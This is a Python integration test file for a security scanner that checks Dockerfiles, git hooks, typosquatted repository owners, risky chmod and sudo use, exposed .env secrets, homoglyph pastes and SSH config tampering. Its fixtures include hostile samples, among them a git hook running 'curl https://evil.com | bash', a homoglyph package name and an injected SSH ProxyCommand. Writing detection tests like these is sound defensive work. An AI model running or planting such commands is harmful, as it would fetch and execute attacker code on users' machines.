"""Integration tests verifying all 6 new security features work together."""

import os
import pytest


class TestDockerScanIntegration:
    def test_scan_finds_dockerfiles(self, tmp_path):
        (tmp_path / "Dockerfile").write_text("FROM python:latest\nCMD echo hi\n")
        (tmp_path / "app").mkdir()
        (tmp_path / "app" / "Dockerfile.dev").write_text("FROM node\nRUN npm install\n")

        from vibefort.dockerscan import find_dockerfiles, scan_dockerfile
        files = find_dockerfiles(str(tmp_path))
        assert len(files) == 2

        all_findings = []
        for f in files:
            all_findings.extend(scan_dockerfile(f))
        assert len(all_findings) > 0


class TestCloneScanIntegration:
    def test_hooks_and_org_scan(self, tmp_path):
        from vibefort.clonescan import check_git_hooks, check_typosquatted_org

        hooks = tmp_path / ".git" / "hooks"
        hooks.mkdir(parents=True)
        (hooks / "post-checkout").write_text("#!/bin/bash\ncurl https://evil.com | bash\n")

        hook_findings = check_git_hooks(str(tmp_path))
        org_findings = check_typosquatted_org("https://github.com/microsft/vscode.git")

        assert len(hook_findings) > 0
        assert len(org_findings) > 0


class TestPermGuardIntegration:
    def test_chmod_and_sudo_together(self):
        from vibefort.permguard import check_chmod_args, check_sudo_args

        chmod_findings = check_chmod_args(["777", "app.py"])
        sudo_findings = check_sudo_args(["pip", "install", "malware"])

        assert len(chmod_findings) > 0
        assert len(sudo_findings) > 0


class TestEnvScanIntegration:
    def test_full_env_check(self, tmp_path):
        (tmp_path / ".git").mkdir()
        env_content = "API_KEY=" + "sk-" + "1234567890abcdef1234" + "\n"
        (tmp_path / ".env").write_text(env_content)
        (tmp_path / ".env.example").write_text(env_content)
        os.chmod(str(tmp_path / ".env"), 0o644)

        from vibefort.envscan import check_env_files
        findings = check_env_files(str(tmp_path))

        rules = {f.rule for f in findings}
        assert "env-not-gitignored" in rules
        assert "env-world-readable" in rules
        assert "env-example-has-secrets" in rules


class TestPasteScanIntegration:
    def test_multiple_attack_vectors(self):
        from vibefort.pastescan import scan_paste

        text = "pip install p\u0430ndas\u200b"
        findings = scan_paste(text)
        rules = {f.rule for f in findings}
        assert "homoglyph" in rules or "hidden-unicode" in rules


class TestConfigGuardIntegration:
    def test_snapshot_and_detect(self, tmp_path):
        ssh_dir = tmp_path / ".ssh"
        ssh_dir.mkdir()
        (ssh_dir / "config").write_text("Host *\n")

        checksums = tmp_path / ".vibefort" / "checksums.toml"
        (tmp_path / ".vibefort").mkdir()

        from vibefort.configguard import snapshot_config_files, check_config_changes

        snapshot_config_files(str(checksums), home=str(tmp_path))
        (ssh_dir / "config").write_text("Host *\n  ProxyCommand evil\n")

        alerts = check_config_changes(str(checksums), home=str(tmp_path))
        assert len(alerts) > 0
